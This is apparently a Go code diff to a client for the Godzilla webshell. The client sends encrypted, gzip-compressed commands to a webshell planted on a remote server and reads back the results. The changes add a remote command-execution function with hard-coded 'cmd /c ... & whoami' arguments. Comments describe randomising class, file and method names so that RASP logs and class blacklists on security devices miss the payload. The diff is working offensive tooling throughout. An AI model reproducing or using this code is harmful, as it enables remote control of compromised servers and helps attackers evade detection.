@@ -41,79 +41,93 @@ func NewGodzillaInfo(g *GodzillaInfo) (*GodzillaInfo, error) {
 }
 
 func (g *GodzillaInfo) GetPayload() []byte {
-	//data := utils.GetFileContent("internal/payloadx/godzilla/java/payloads.class")
-	//fmt.Println(payloads.GodClassFiles)
 	if g.Script == shell.JavaScript {
 		data := payloads.GodClassFiles
-		//return g.dynamicUpdateClassName("payload", data)
-		return g.dynamicUpdateClassName("payload", data)
+		// 原始类名为 payloadv4
+		return g.dynamicUpdateClassName("payloadv4", data)
 	} else if g.Script == shell.PhpScript {
 		data := payloads.GodPhpFiles
 		r1 := utils.RandomRangeString(20, 200)
 		data = bytes.Replace(data, []byte("FLAG_STR"), []byte(r1), 1)
-		//return g.dynamicUpdateClassName("payload", data)
 		return data
 	} else if g.Script == shell.CsharpScript {
 		data := payloads.GodDllFiles
-		//return g.dynamicUpdateClassName("payload", data)
 		return data
 	} else if g.Script == shell.AspScript {
 		data := payloads.GodAspFiles
-		//return g.dynamicUpdateClassName("payload", data)
 		return data
 	} else {
 		return nil
 	}
 }
 
-// EvalFunc 简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
+// EvalFunc 个人简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
 func (g *GodzillaInfo) EvalFunc(className, funcName string, parameter *godzilla.Parameter) []byte {
 	// 填充随机长度，避免 test 请求和 getBasicInfo 请求的长度每次都一样
-	r1, r2 := utils.RandomRangeString(50, 200), utils.RandomRangeString(10, 100)
+	r1, r2 := utils.RandomRangeString(10, 100), utils.RandomRangeString(10, 100)
 	parameter.AddString(r1, r2)
 	if className != "" && len(strings.Trim(className, " ")) > 0 {
-		if g.Script == "JavaDynamicPayload" {
+		if g.Script == shell.JavaScript {
 			parameter.AddString("evalClassName", g.dynamicClassNameHashMap[className])
-		} else if g.Script == "PhpDynamicPayload" {
+		} else if g.Script == shell.PhpScript || g.Script == shell.AspScript {
 			parameter.AddString("codeName", className)
-		} else if g.Script == "CSharpDynamicPayload" {
+		} else if g.Script == shell.CsharpScript {
 			parameter.AddString("evalClassName", className)
 		}
 	}
 	parameter.AddString("methodName", funcName)
+	fmt.Printf("%v\n", parameter)
 	data := parameter.Serialize()
-	fmt.Println("序列化后的参数: ", string(data))
-	//fmt.Println(len(data))
-	data, _ = gzip.GzipCompress(data)
-	data = godzilla.Encrypto(data, g.secretKey, g.Password, g.Crypto, g.Script)
-	result, ok := httpx.RequestAndParse(g.Url, g.Proxy, g.Headers, string(data), 0, 0)
-	if !ok {
-		panic("EvalFunc1 error")
+	return g.sendPayload(data)
+}
+
+func (g *GodzillaInfo) sendPayload(payload []byte) []byte {
+	var enData []byte
+	if g.Script == shell.AspScript {
+		enData = godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
+		result, ok := httpx.RequestAndParse(g.Url, g.Proxy, g.Headers, string(enData), 0, 0)
+		if !ok {
+			panic("EvalFunc1 error")
+		}
+		deData := godzilla.Decrypto(result.Data, g.secretKey, g.Password, g.Crypto, g.Script)
+		return deData
+	} else {
+		gzipData, _ := gzip.GzipCompress(payload)
+		enData = godzilla.Encrypto(gzipData, g.secretKey, g.Password, g.Crypto, g.Script)
+		result, ok := httpx.RequestAndParse(g.Url, g.Proxy, g.Headers, string(enData), 0, 0)
+		if !ok {
+			panic("EvalFunc1 error")
+		}
+		deData := godzilla.Decrypto(result.Data, g.secretKey, g.Password, g.Crypto, g.Script)
+		res, err := gzip.GzipDeCompress(deData)
+		if err != nil {
+			panic("EvalFunc error :" + err.Error())
+		}
+		return res
 	}
-	deData := godzilla.Decrypto(result.Data, g.secretKey, g.Password, g.Crypto, g.Script)
-	res, err := gzip.GzipDeCompress(deData)
-	if err != nil {
-		panic("EvalFunc error :" + err.Error())
-	}
-	return res
 }
 
 // 替换为随机包名，用于对抗一些类黑名单机制的设备
 // 在 Rasp 日志的堆栈中发现可以看到很明显的 payload.java
 // 所以尝试替换一下 SourceFile 为随机
 // 再尝试替换一下调用的函数为随机,如 execCommand 函数的功能有点太直白了
-func (g *GodzillaInfo) dynamicUpdateClassName(protoName string, classContent []byte) []byte {
+func (g *GodzillaInfo) dynamicUpdateClassName(oldName string, classContent []byte) []byte {
+	fileName := oldName + ".java"
 	fakeFileName := utils.RandomRangeString(5, 12) + ".java"
-	// 替换 SourceFile Hex值为 : 000C7061796C6F61642E6A617661 / 00 0C payload.java
-	classContent = bytes.Replace(classContent, dynamic.MergeBytes([]byte{00, byte(len(protoName + ".java"))}, []byte(protoName+".java")), dynamic.MergeBytes([]byte{00, byte(len(fakeFileName))}, []byte(fakeFileName)), 1)
-	g.dynamicClassNameHashMap[protoName+".java"] = fakeFileName
-	classContent = bytes.Replace(classContent, dynamic.MergeBytes([]byte{00, byte(len("execCommand"))}, []byte("execCommand")), dynamic.MergeBytes([]byte{00, byte(len("whoami"))}, []byte("whoami")), 1)
-	g.dynamicClassNameHashMap["execCommand"] = "whoami"
-	newClassName := dynamic.RandomClassName()
-	g.dynamicClassNameHashMap[protoName] = newClassName
 
-	fmt.Println("随机包名Class :", newClassName)
-	return dynamic.ReplaceClassName(classContent, protoName, newClassName)
+	// 替换 SourceFile Hex值为 : 000C7061796C6F61642E6A617661 / 00 0C payload.java
+	classContent = dynamic.ReplaceSourceFile(classContent, fileName, fakeFileName)
+	g.dynamicClassNameHashMap[fileName] = fakeFileName
+
+	// 替换 execCommand() 函数为 whoami() 函数
+	classContent = dynamic.ReplaceFuncName(classContent, "execCommand", "execCommand2")
+	g.dynamicClassNameHashMap["execCommand"] = "execCommand2"
+
+	// 随机替换类名
+	newClassName := dynamic.RandomClassName()
+	g.dynamicClassNameHashMap[oldName] = newClassName
+	fmt.Println("随机包名Class :", g.dynamicClassNameHashMap)
+	return dynamic.ReplaceClassName(classContent, oldName, newClassName)
 }
 
 func getParameter() *godzilla.Parameter {
@@ -160,9 +174,17 @@ func (g *GodzillaInfo) getBasicsInfo() string {
 // 命令执行
 func (g *GodzillaInfo) execCommand(commandStr string) string {
 	parameter := getParameter()
+	// 这个 cmdLine 多半是为了兼容 godzilla v3 ?
 	parameter.AddBytes("cmdLine", []byte(commandStr))
+	parameter.AddBytes("arg-0", []byte("cmd"))
+	parameter.AddBytes("arg-1", []byte("/c"))
+	parameter.AddBytes("arg-2", []byte(`cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami`))
+	//parameter.AddBytes("args-1", []byte("whoami"))
+	parameter.AddString("argsCount", "3")
+	parameter.AddString("executableFile", "cmd")
+	parameter.AddString("executableArgs", `/c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami"`)
+
 	result := g.EvalFunc("", g.dynamicClassNameHashMap["execCommand"], parameter)
-	//result := g.EvalFunc("", "execCommand", parameter)
 	return string(result)
 }
 
@@ -416,4 +438,8 @@ func (g *GodzillaInfo) Ping(p shell.IParams) bool {
 
 func (g *GodzillaInfo) BasicInfo() string {
 	return g.getBasicsInfo()
+}
+
+func (g *GodzillaInfo) CommandExec() string {
+	return g.execCommand(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami"`)
 }
